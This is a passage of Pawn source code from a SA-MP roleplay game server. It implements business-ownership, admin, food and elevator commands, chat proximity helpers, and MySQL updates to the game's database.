			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are to far from your business.");
			return 1;
		}
		else
		{
			GivePlayerCash(playerid,cashdeposit);
			BizzInfo[bouse][bTill] -= cashdeposit;
			format(string, sizeof(string), "{FFFF00}You have withdrawn $%s from your till. Total: $%s.", FormatNumber(cashdeposit),FormatNumber(BizzInfo[bouse][bTill]));
			SendClientMessage(playerid, COLOR_YELLOW, string);
	        new str1[184];
			mysql_format(SQL,str1,sizeof(str1),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bouse][bTill],bouse);
			mysql_tquery(SQL,str1,"","");
			Update(playerid, pCashx);
			return 1;
		}
	}
	return 1;
}
CMD:bizfee(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new bouse = PlayerInfo[playerid][pPbiskey];
		if (bouse == 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a business.");
		new fee,string[64];
		if(sscanf(params, "d",fee)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/bizfee <Money>");
		if(fee < 1 || fee > 5000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Minimum fee is $1, maximum fee is $5,000.");
		BizzInfo[bouse][bEntranceCost] = fee;
		format(string, sizeof(string), "{FFFF00}Entrance fee set to $%s.", FormatNumber(BizzInfo[bouse][bEntranceCost]));
        new str1[184];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE `bizz` SET `EntranceCost`='%d' WHERE `ID`='%d'",BizzInfo[bouse][bEntranceCost],bouse);
		mysql_tquery(SQL,str1,"","");
		OnPropTextdrawUpdate(2,bouse);
		SendClientMessage(playerid, COLOR_SERVER, string);
	}
	return 1;
}
CMD:bizname(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new bouse = PlayerInfo[playerid][pPbiskey];
		if (bouse == 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a business.");
		new result[60],string[128];
		if(sscanf(params, "s[60]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/bizname <Message>");
		new maxc = strlen(result);
		if(maxc > 20) return SCM(playerid,COLOR_SERVER,"{FFB870}Maximum caracter is 20.");
		new result2[250];
		mysql_real_escape_string(result, result2);
		strmid(BizzInfo[bouse][bMessage], result2, 0, 64, 255);
		format(string, sizeof(string), "{FFFF00}Business name set to %s.",BizzInfo[bouse][bMessage]);
        new str1[184];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE bizz SET Message='%s' WHERE ID='%d'",BizzInfo[bouse][bMessage],bouse);
		mysql_tquery(SQL,str1,"","");
		OnPropTextdrawUpdate(2, bouse);
		SendClientMessage(playerid, COLOR_SERVER, string);
	}
	return 1;
}
CMD:sellbizto(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		SCM(playerid, COLOR_SERVER, "The sales / exchanges are made by order /trade.");
	}	
	return 1;
}
CMD:sellbiztostate(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new string[70];
		if(PlayerInfo[playerid][pPbiskey] == 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a bussines.");
		if(PlayerInfo[playerid][pPbiskey] != 255)
		{
			new bouse = PlayerInfo[playerid][pPbiskey];
			BizzInfo[bouse][bLocked] = 1;
			BizzInfo[bouse][bOwned] = 0;
			strmid(BizzInfo[bouse][bOwner], "The State", 0, strlen("The State"), 255);
			new cashb = floatround(floatmul(BizzInfo[bouse][bBuyPrice],0.70),floatround_ceil);
			GivePlayerCash(playerid,cashb);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "~w~Congratulations~n~ You have sold your property for ~n~~g~$%d",cashb);
			GameTextForPlayer(playerid, string, 10000, 3);
			PlayerInfo[playerid][pPbiskey] = 255;
            new str1[184];
			mysql_format(SQL,str1,sizeof(str1),"UPDATE `bizz` SET `Locked`='0',`Owned`='0',`Till`='0',`Owner`='The State' WHERE `ID`='%d'",bouse);
			mysql_tquery(SQL,str1,"","");
			Update(playerid,pCashx);
			Update(playerid,pPbiskeyx);
			OnPropTextdrawUpdate(2,bouse);
			return 1;
		}
		else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't own a business.");
	}
	return 1;
}
CMD:buybiz(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		new string[128],sendername[25],stringcasa[128];
		if(PlayerInfo[playerid][pPbiskey] != 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You already own a business, type /sellbiztostate if you want to buy this one.");
		for(new b = 1; b < sizeof(BizzInfo); b++)
		{
			if(PlayerToPoint(2.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bOwned] == 0)
			{
				if(PlayerInfo[playerid][pLevel] < BizzInfo[b][bLevelNeeded])
				{
					format(string, sizeof(string), "{FFB870}You must be level %d to purchase this.",BizzInfo[b][bLevelNeeded]);
					SendClientMessage(playerid, COLOR_SERVER, string);
					return 1;
				}
				if(GetPlayerCash(playerid) > BizzInfo[b][bBuyPrice])
				{
					PlayerInfo[playerid][pPbiskey] = b;
					BizzInfo[b][bOwned] = 1;
					GetPlayerName(playerid, sendername, sizeof(sendername));
					strmid(BizzInfo[b][bOwner], PlayerInfo[playerid][pNormalName], 0, 25, 255);
					GivePlayerCash(playerid,-BizzInfo[b][bBuyPrice]);
					GameTextForPlayer(playerid, "~w~Welcome~n~You can exit at any time by moving to this door and press enter", 5000, 3);
					if(BizzInfo[b][bSbiz] == 0)
					{
						PlayerInfo[playerid][pInt] = BizzInfo[b][bInterior];
						PlayerInfo[playerid][pLocal] = b ;
						InBussines[playerid] = b;
						SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
						SetPlayerVirtualWorld(playerid, BizzInfo[b][bVirtual]);
						PlayerInfo[playerid][pInt] = BizzInfo[b][bInterior];
						SetPlayerPosEx(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
					}
					SendClientMessage(playerid, COLOR_SERVER, "Congratulations, On Your New Purchase.");
					SendClientMessage(playerid, COLOR_SERVER, "Type /help to review the new business help section.");
					format(stringcasa, sizeof(stringcasa), "%s [user:%d] bought biz site [bizz:%d] of State $%s.",sendername,PlayerInfo[playerid][pSQLID],b,FormatNumber(BizzInfo[b][bBuyPrice]));
                    ABroadCast(COLOR_YELLOW, stringcasa,1);
                    new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
					getdate(y,m,d);
					gettime(h,mi,s);
					format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] bought bizz %d for $%s.",d,m,y,h,mi,s,sendername,PlayerInfo[playerid][pSQLID],b,FormatNumber(BizzInfo[b][bBuyPrice]));
 					mysql_real_escape_string(string2, string3);
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','0','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
					mysql_tquery(SQL,var100,"","");
					new str1[256];
					mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Money`='%d',`Bizz`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pPbiskey],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str1,"","");
					mysql_format(SQL,str1,sizeof(str1),"UPDATE `bizz` SET `Owned`='1',`Owner`='%s' WHERE `ID`='%d'",BizzInfo[b][bOwner],b);
					mysql_tquery(SQL,str1,"","");
					OnPropTextdrawUpdate(2,b);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "You don't have the cash for that");
					return 1;
				}
			}
		}
	}
	return 1;
}
CMD:rules(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    SendClientMessage(playerid, COLOR_TUTORIAL,"_______________________________________");
	    SendClientMessage(playerid, COLOR_TUTORIAL," ");
	    SendClientMessage(playerid, COLOR_YELLOW,"Rules can be found on ww.T-Zone.ir");
	    SendClientMessage(playerid, COLOR_TUTORIAL," ");
	    SendClientMessage(playerid, COLOR_TUTORIAL," _______________________________________");
	}
	return 1;
}
CMD:forum(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    SendClientMessage(playerid, COLOR_YELLOW,"Address Site : http://www.T-Zone.ir");
	}
	return 1;
}
CMD:panel(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    SendClientMessage(playerid, COLOR_YELLOW,"User Panel http://ucp.T-Zone.ir.");
	}
	return 1;
}
CMD:setkey(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,x_nr[10],key;
	if(sscanf(params, "s[10]ud",x_nr,id,key)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setkey <Car-House-Bussines> <Name/Playerid> <Key ID(House(999)-Bussines(255)-Car(0)-Moto(0)-Heli(0)-PCar(0)-PCar2(0)-Plus(0)-Plus2(0)>");
    if(strcmp(x_nr,"house",true) == 0)
 	{
		PlayerInfo[id][pPhousekey] = key;
		Update(id,pPhousekeyx);
	    return 1;
	}
    if(strcmp(x_nr,"bussines",true) == 0)
 	{
		PlayerInfo[id][pPbiskey] = key;
		Update(id,pPbiskeyx);
   	    return 1;
	}
    if(strcmp(x_nr,"car",true) == 0)
 	{
		PlayerInfo[id][pPcarkey] = key;
		Update(id,pPcarkeyx);
		return 1;
	}
    if(strcmp(x_nr,"car2",true) == 0)
 	{
		PlayerInfo[id][pmotokey] = key;
		Update(id,pmotokeyx);
		return 1;
	}
	if(strcmp(x_nr,"pcar2",true) == 0)
 	{
		PlayerInfo[id][pprcarkey2] = key;
		Update(id,pprcarkey2x);
		return 1;
	}
	if(strcmp(x_nr,"plus",true) == 0)
 	{
		PlayerInfo[id][pPPluscarkey] = key;
		Update(id,pPPluscarkeyx);
		return 1;
	}
	if(strcmp(x_nr,"plus2",true) == 0)
 	{
		PlayerInfo[id][pPPluscarkey2] = key;
		Update(id,pPPluscarkey2x);
		return 1;
	}
    if(strcmp(x_nr,"pcar",true) == 0)
 	{
		PlayerInfo[id][pprcarkey] = key;
		Update(id,pprcarkeyx);
		return 1;
	}
    return 1;
}
CMD:setpremium(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,string[128];
	if(sscanf(params, "u",id)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setpremium <Name/Playerid>");
	PlayerInfo[id][pPremiumAccount] = 1;
    mysql_format(SQL, string, sizeof(string), "UPDATE users SET `Premium`='1' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
    mysql_tquery(SQL,string,"","");
    return 1;
}
CMD:removepremium(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,string[128];
	if(sscanf(params, "u",id)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/removepremium <Name/Playerid>");
	PlayerInfo[id][pPremiumAccount] = 0;
    mysql_format(SQL, string, sizeof(string), "UPDATE users SET `Premium`='0' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
    mysql_tquery(SQL,string,"","");
    return 1;
}
CMD:hprice(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new cashdeposit,string[356];
	if(sscanf(params, "d",cashdeposit)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/hprice <Amount of Money>");
    for(new i = 1; i < sizeof(HouseInfo); i++)
	{
		if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
		{
			HouseInfo[i][hValue] = cashdeposit;
	        mysql_format(SQL, string, sizeof(string), "UPDATE houses SET `Value`='%d' WHERE ID=%d",cashdeposit,i);
	        mysql_tquery(SQL,string,"","");
	        OnPropTextdrawUpdate(1,i);
		}
	}
	for(new i = 1; i < sizeof(BizzInfo); i++)
	{
		if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
		{
			BizzInfo[i][bBuyPrice] = cashdeposit;
	        mysql_format(SQL, string, sizeof(string), "UPDATE bizz SET `BuyPrice`='%d' WHERE ID=%d",cashdeposit,i);
	        mysql_tquery(SQL,string,"","");
	        OnPropTextdrawUpdate(2,i);
		}
	}
	return 1;
}
CMD:hlevel(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new cashdeposit,string[356];
	if(sscanf(params, "d",cashdeposit)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/hlevel <Level>");
    for(new i = 1; i < sizeof(HouseInfo); i++)
	{
		if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
		{
			HouseInfo[i][hLevel] = cashdeposit;
	        mysql_format(SQL, string, sizeof(string), "UPDATE houses SET `Level`='%d' WHERE ID=%d",cashdeposit,i);
	        mysql_tquery(SQL,string,"","");
	        OnPropTextdrawUpdate(1,i);
		}
	}
	for(new i = 1; i < sizeof(BizzInfo); i++)
	{
		if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
		{
			BizzInfo[i][bLevelNeeded] = cashdeposit;
	        mysql_format(SQL, string, sizeof(string), "UPDATE bizz SET `LevelNeeded`='%d' WHERE ID=%d",cashdeposit,i);
	        mysql_tquery(SQL,string,"","");
	        OnPropTextdrawUpdate(2,i);
		}
	}
	return 1;
}
CMD:eat(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(InBussines[playerid] > 0)
		{
			if(BizzInfo[InBussines[playerid]][bType] == 7 || BizzInfo[InBussines[playerid]][bType] == 9 || BizzInfo[InBussines[playerid]][bType] == 14)
			{
				new bid = InBussines[playerid],str[256];
				if(GetPlayerCash(playerid) < 100) return SCM(playerid,COLOR_GREY,"You don't have enough money.");
				new Float:health;
				GetPlayerHealthEx(playerid,health);
				if(health >= 75)
				{
					SetPlayerHealthEx(playerid, 100);
					ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
					GivePlayerCash(playerid, -100);
					GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
					BizzInfo[bid][bTill] += 100;
					Update(playerid,pCashx);
					mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
					mysql_tquery(SQL,str,"","");
				}
				else
				{
					SetPlayerHealthEx (playerid, health+25);
					ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
					GivePlayerCash(playerid, -100);
					GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
					Update(playerid,pCashx);
					mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
					mysql_tquery(SQL,str,"","");
				}
			}	
		}	
		else
		{
			new continua = 0;
			for(new i = 0; i < sizeof(Standuri); i++) if(IsPlayerInRangeOfPoint(playerid, 3.0, Standuri[i][0], Standuri[i][1], Standuri[i][2])) continua = 1;
			if(continua == 1)
			{
				if(GetPlayerCash(playerid) < 100) return SCM(playerid,COLOR_GREY,"You do not have enough money.");
				new Float:health;
				GetPlayerHealthEx(playerid,health);
				if(health >= 75)
				{
					SetPlayerHealthEx(playerid, 100);
					ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
					GivePlayerCash(playerid, -100);
					GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
					Update(playerid,pCashx);
				}
				else
				{
					SetPlayerHealthEx (playerid, health+25);
					ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
					GivePlayerCash(playerid, -100);
					GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
					Update(playerid,pCashx);
				}
			}
		}
	}
	return 1;
}
CMD:buyfood(playerid, params[])
{
	return cmd_eat(playerid, params);
}
CMD:securitate(playerid, params[])
{
	new cuvantnou[255],cuvantnou2[255],ptsql[1000],activ;
	if(strlen(PlayerInfo[playerid][pCuvant]) == 4)
	{
		if(sscanf(params, "s[255]i",cuvantnou,activ)) return SCM(playerid, -1, "Use: /securitate [key word] (0/1, 1 = activ)");
		if(strlen(cuvantnou) > 4 && strlen(cuvantnou) < 21)
		{
			if(activ != 1) return SCM(playerid, COLOR_ERROR, "It needs to put number 1 at the end!");
			mysql_real_escape_string(cuvantnou,cuvantnou2);
			mysql_format(SQL, ptsql, sizeof(ptsql), "UPDATE `users` SET `CuvantCheie`='%s' WHERE `id`='%d'",cuvantnou2,PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, ptsql, "", "");
			format(ptsql, sizeof(ptsql), "Your keyword is now %s",cuvantnou);
			SCM(playerid, COLOR_ERROR, ptsql);
			SCM(playerid, COLOR_ERROR, "Please take a picture to it, because you will not be able to play without the word.");
		}
		else return SCM(playerid, COLOR_ERROR, "Your keyword must be at least 5 characters and a maximum of 20 characters.");
	}
	else return SCM(playerid, COLOR_ERROR, "Already a keyword set.");
	return 1;
}
/*CMD:creeazaomzapada(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7) return SCM(playerid, COLOR_ERROR, "Nu ai acces la aceasta comanda.");
	if(ultimulomdezapada > sizeof(OMZapada)) return SCM(playerid, COLOR_ERROR, "Ai atins limita maxima de oameni de zapada.");
	ultimulomdezapada+=1;
	new id = ultimulomdezapada;
	new mysqlinsert[1500];
	GetPlayerPos(playerid, OMZapada[id][PozitieOMZapada][0],OMZapada[id][PozitieOMZapada][1],OMZapada[id][PozitieOMZapada][2]);
	mysql_format(SQL, mysqlinsert, sizeof(mysqlinsert), "INSERT INTO oameni_de_zapada (`ID`,`X`,`Y`,`Z`) VALUES ('%d','%f','%f','%f')",ultimulomdezapada,OMZapada[id][PozitieOMZapada][0],OMZapada[id][PozitieOMZapada][1],OMZapada[id][PozitieOMZapada][2]);
	mysql_tquery(SQL, mysqlinsert, "", "");
	incarcaomdezapada = 3;
	return 1;
}*/
CMD:clearmychat(playerid, params[])
{
	if(gPlayerLogged[playerid] > 0)
	{
		new id = playerid;
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
		SendClientMessage(id, COLOR_SYSTEM, " ");
	}				
	return 1;
}
CMD:elevator(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsACop(playerid)) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not a cop.");
	if(IsPlayerInRangeOfPoint(playerid, 4.0, 1568.5184,-1690.2205,5.8906))
	{
	    SetPlayerPosEx(playerid,1564.8662,-1666.4962,28.3956);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 4.0, 1564.8662,-1666.4962,28.3956))
	{
	    SetPlayerPosEx(playerid,1568.5184,-1690.2205,5.8906);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 4.0, 2340.2810,2456.5625,14.9688))
	{
	    SetPlayerPosEx(playerid,2339.3237,2461.2197,38.6837);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 4.0, 2339.3237,2461.2197,38.6837))
	{
	    SetPlayerPosEx(playerid,2340.2810,2456.5625,14.9688);
	}
	return 1;
}
CMD:elevator2(playerid, params[])
{
		if(!IsAMedic(playerid)) return SCM(playerid,COLOR_SERVER,"{FFB870}Shoma Pezeshk Nistid");
	if(IsPlayerInRangeOfPoint(playerid, 4.0, 1172.55933,-1320.73059, 15.04141))
	{
	    SetPlayerPosEx(playerid,1165.84,-1348.77,30.54);
	}
	return 1;
}


// OnPlayerCommandText
public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(TutTime[playerid] >= 1 || RegistrationStep[playerid] >= 1) return 0;
	//---- Anti SPAM ----//
    if (cmdtext[0] && !strcmp(cmdtext, LastText[playerid]) && LastTextTime[playerid] > GetTickCount() && PlayerInfo[playerid][pAdmin] < 1 ) return 0;
	LastTextTime[playerid] = GetTickCount() + SECONDS_BETWEEN_SAME_MSGS * 1000;
	strcpy(LastText[playerid], cmdtext, 128);
	printf("[cmd] %s (%d): %s", PlayerInfo[playerid][pNormalName], playerid, cmdtext);
	//---- Anti SPAM ----//
    return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(success)
	{
		SpamCheck[playerid] = GetTickCount();
	}
	if(!success) return SCM(playerid, COLOR_ERROR, "SERVER: Unknown command.");
	return 1;
}

public ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		foreach(Player,i)
		{
			if(GetPlayerInterior(playerid) == GetPlayerInterior(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
						SendClientMessage(i, col1, string);
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
						SendClientMessage(i, col2, string);
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
						SendClientMessage(i, col3, string);
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
						SendClientMessage(i, col4, string);
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
						SendClientMessage(i, col5, string);
					}
				}
				else
				{
					SendClientMessage(i, col1, string);
				}
			}
		}
	}
	return 1;
}

public CrimInRange(Float:radi, playerid,copid)
{
	if(IsPlayerConnected(playerid)&&IsPlayerConnected(copid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(copid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

public payala2(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    payala[playerid] = 0;
	}
	return 0;
}
public ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

public PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}
public OnPropTextdrawUpdate(update, h)
{
	new PropertyString[1000];
	if(update == 1)
	{
		if(HouseInfo[h][hOwned] == 0)
		{
			DestroyDynamic3DTextLabel(HouseLabel[h]);
			format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {0066FF}%d \n{0066FF}This house is for sale(/buyhouse) ! \n{FFFFFF}Description: {0066FF}%s \n{FFFFFF}Price: {0066FF}$%s \n{FFFFFF}Level: {0066FF}%d",h,HouseInfo[h][hDiscription],FormatNumber(HouseInfo[h][hValue]),HouseInfo[h][hLevel]);
